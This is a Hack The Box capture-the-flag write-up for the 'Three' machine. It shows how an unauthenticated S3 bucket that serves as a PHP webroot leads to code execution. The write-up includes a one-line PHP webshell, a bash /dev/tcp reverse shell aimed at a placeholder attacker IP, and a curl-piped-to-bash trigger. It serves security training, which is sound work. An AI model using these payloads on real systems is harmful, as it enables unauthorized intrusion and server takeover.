HTB — Three

🐧 Linux Easy AWS S3 Cloud Misconfig PHP Shell Subdomain Enum
00

Overview

This box revolves around a misconfigured AWS S3 bucket that's being used as the webroot for a PHP site. The goal was to enumerate subdomains, find the exposed S3 endpoint, then upload a PHP reverse shell directly into the webroot and catch a connection back. Once you understand what's going on, it all clicks together pretty fast — but it's a great real-world lesson on cloud misconfigurations.

01

Recon — Nmap

I started by running an Nmap scan with service detection to see what ports were open on the target:

# Service version scan sudo nmap -sV 10.129.227.248 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 80/tcp open http Apache httpd 2.4.29
Only two ports: 22 (SSH) and 80 (HTTP). Nothing unusual — I moved straight to the web app.
02

Web Enumeration

I opened the site in the browser and found a static-looking concert ticket page. The booking form wasn't functional, but I dug into the source code and noticed the Contact form was POSTing to /action_page.php — so the backend was definitely running PHP. Going directly to /index.php also worked, which confirmed it.

More interestingly, the Contact section had an email address with the domain thetoppers.htb. That told me the machine was using virtual hosting, so I added it to my hosts file right away:

# Map the domain to the target IP echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts
03

Subdomain Enumeration

With a domain name available, I suspected there might be hidden subdomains. I ran gobuster in vhost mode, pointing it at the top-5000 subdomain wordlist:

# Bruteforce virtual hosts gobuster vhost \ -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt \ -u http://thetoppers.htb Found: s3.thetoppers.htb (Status: 404) [Size: 21]
I found the subdomain s3.thetoppers.htb. The name "s3" immediately suggested an AWS S3 bucket endpoint. I added it to /etc/hosts and visited it:
# Add the S3 subdomain echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts

Visiting http://s3.thetoppers.htb returned just: {"status": "running"}. Minimal response, but it confirmed the service was up and reachable.

04

Enumerating the S3 Bucket

I used awscli to poke at the bucket. Since the service appeared to have no real auth, I configured it with dummy credentials — the server didn't check them:

# Set up awscli with throwaway values aws configure # Access Key ID: temp # Secret Access Key: temp # Default region: us-east-1 # Output format: json
# List all available buckets aws --endpoint=http://s3.thetoppers.htb s3 ls 2024-01-01 00:00:00 thetoppers.htb

Found a bucket named thetoppers.htb. I listed what was inside it:

# List bucket contents aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb PRE images/ 2024-01-01 00:00:00 0 .htaccess 2024-01-01 00:00:00 5378 index.php
The bucket contains index.php and .htaccess — this is the actual web root of the site on port 80. Apache is serving files directly from this S3 bucket. That means anything I upload here becomes accessible through the website.
05

Uploading a PHP Webshell

Since the server runs PHP and I could write to the bucket, I created a dead-simple PHP webshell. It reads a URL parameter cmd and passes it to system():

# Create the webshell echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Upload it directly into the web root via S3 aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb upload: ./shell.php to s3://thetoppers.htb/shell.php

Then I visited the shell in the browser and tested RCE with a quick id command:

# Test code execution http://thetoppers.htb/shell.php?cmd=id uid=33(www-data) gid=33(www-data) groups=33(www-data)
Got back uid=33(www-data) — remote code execution confirmed on the box.
06

Catching a Reverse Shell

A webshell is useful but I wanted a proper interactive shell. I grabbed my tun0 IP with ifconfig, then wrote a bash reverse shell payload into a file:

# shell.sh #!/bin/bash bash -i >& /dev/tcp/YOUR_TUN0_IP/1337 0>&1

I opened two terminal tabs — one for the listener, one for the HTTP server to deliver the file:

# Terminal 1 — catch the shell nc -nvlp 1337
# Terminal 2 — serve shell.sh (run from same directory) python3 -m http.server 8000

Then I triggered the payload through the webshell using curl piped straight to bash:

# Deliver and execute the reverse shell http://thetoppers.htb/shell.php?cmd=curl%20YOUR_IP:8000/shell.sh|bash
My Netcat listener got a connection. I now had an interactive shell as www-data on the machine.
07

Grabbing the Flag

With shell access, I went straight for the flag. It was sitting in /var/www/:

# Read the flag cat /var/www/flag.txt

Flag Retrieved

/var/www/flag.txt

08

Attack Chain

  • 1
    Nmap Scan

    Scanned the target and found ports 22 and 80 open. Went straight to the web app.

  • 2
    Domain Discovery

    Found thetoppers.htb in the contact email. Added it to /etc/hosts.

  • 3
    Subdomain Bruteforce

    Used Gobuster in vhost mode and discovered s3.thetoppers.htb.

  • 4
    S3 Bucket Enumeration

    Used awscli with dummy credentials to list the bucket. Discovered it was the site's webroot.

  • 5
    Webshell Upload

    Copied a PHP one-liner webshell into the S3 bucket and confirmed RCE via the browser.

  • 6
    Reverse Shell

    Delivered a bash reverse shell via the webshell using curl | bash. Caught it on Netcat.

  • 7
    Flag

    Read /var/www/flag.txt and completed the box.

09

Key Takeaways

Never expose an S3 bucket without authentication — especially one that serves as a webroot. If an attacker can write files to your bucket, they can upload a shell and own the server.
Always enumerate subdomains. The main site looked totally harmless — the real attack surface was hiding on a subdomain that most people would miss.
S3 + PHP webroot = game over. Combining a publicly writable S3 bucket with a PHP-enabled web server is one of the most dangerous misconfigurations you can make.
